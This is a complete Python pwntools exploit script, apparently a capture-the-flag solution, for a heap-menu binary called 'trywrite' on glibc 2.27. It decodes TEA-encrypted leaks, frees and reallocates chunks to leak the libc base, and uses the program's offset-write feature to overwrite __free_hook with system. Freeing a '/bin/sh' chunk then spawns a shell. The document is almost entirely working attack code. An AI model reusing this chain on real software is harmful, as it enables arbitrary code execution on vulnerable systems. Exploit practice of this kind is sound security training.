#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys
from ctypes import c_uint32

# Create a symbol file for GDB debugging
try:
    gdb_symbols = '''
    
    '''

    f = open('/tmp/gdb_symbols.c', 'w')
    f.write(gdb_symbols)
    f.close()
    os.system('gcc -g -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
    # os.system('gcc -g -m32 -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
except Exception as e:
    print(e)

context.arch = "amd64"
# context.log_level = 'debug'
execve_file = './trywrite'
# sh = process(execve_file, env={"LD_PRELOAD": "/tmp/gdb_symbols.so"})
sh = process(execve_file)
elf = ELF(execve_file)
libc = ELF('./libc-2.27.so')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    set $ptr=(void **)$rebase(0x203030)

    b *$rebase(0x1945) 
    b *$rebase(0x1344) 
    b *$rebase(0x19B7) 
    b *$rebase(0x16B6) 
    '''

    f = open('/tmp/pid', 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdbscript', 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

def _decode(v, k, delta):
    v0 = c_uint32(v[0])
    v1 = c_uint32(v[1])
    sum = c_uint32(0xe3779b90)
    for i in range(16):
        v1.value -= ((v0.value << 4) + k[2]) ^ (v0.value + sum.value) ^ ((v0.value >> 5) + k[3])
        v0.value -= ((v1.value << 4) + k[0]) ^ (v1.value + sum.value) ^ ((v1.value >> 5) + k[1])
        sum.value -= delta

    return struct.pack('II', v0.value, v1.value)


def qqtea_decode(data, key, delta):
    k = struct.unpack('IIII', key)
    length = int(len(data) / 8)
    d = struct.unpack('II' * length, data)
    return ''.join([_decode([d[i * 2], d[i * 2 + 1]], k, delta) for i in range(length)])

def Add(key, content):
    sh.sendlineafter('command>> \n', '1')
    sh.sendafter('Please tell me the key:\n', key)
    sh.sendafter('Please tell me the date:\n', content)

def Delete(index):
    sh.sendlineafter('command>> \n', '3')
    sh.sendlineafter('Please tell me the index:\n', str(index))

def Change(key0_offset, key1_offset, content):
    sh.sendlineafter('command>> \n', '4')
    sh.sendlineafter('Give me how far the first key is from your heap:\n', str(key0_offset))
    sh.sendlineafter('Give me how far the second key is from the first key:\n', str(key1_offset))
    sh.sendafter('Please tell me the new key:\n', content)

key = 'k' * 16
heap_addr = 0xabc000

sh.sendlineafter('Please tell me where is your heap:\n', str(0xabc000))
sh.sendlineafter('Do you want to tell me your name now?(Y/N)\n', 'Y')
sh.sendline('good person')

# leak libc addr
for i in range(8 + 1):
    Add(key, '\n')

for i in range(8):
    Delete(i)

for i in range(8):
    Add(key, '\n')

# pause()
sh.sendlineafter('command>> \n', '2')
sh.sendlineafter('Please tell me the index:\n', str(7))

raw = sh.recvn(0x80)
data = qqtea_decode(raw, key, 0x9e3779b9)
print(hexdump(data))

main_arena_addr = u64(data[0:8]) + 0x40
log.success("main_arena_addr: " + hex(main_arena_addr))
libc_addr = main_arena_addr - 0x3ebc40
log.success("libc_addr: " + hex(libc_addr))

# modify the field of ptr 
Change(0x68 + 1, 0, p64(heap_addr)[1:] + '\x69' + p64(0))

# write __free_hook to the ptr field
__free_hook_addr = libc_addr + libc.symbols['__free_hook']
log.success("__free_hook_addr: " + hex(__free_hook_addr))

Change(0x50, 0, p64(__free_hook_addr) + p64(0))

# hijack __free_hook
system_addr = libc_addr + libc.symbols['system']
log.success("system_addr: " + hex(system_addr))

key0_offset = __free_hook_addr - heap_addr
key1_offset = heap_addr + 0x20001

Change(key0_offset, key1_offset, p64(system_addr) + p64(0))

Add('/bin/sh\0'.ljust(16, '\0'), '\n') # index 9
Delete(9)


sh.interactive()
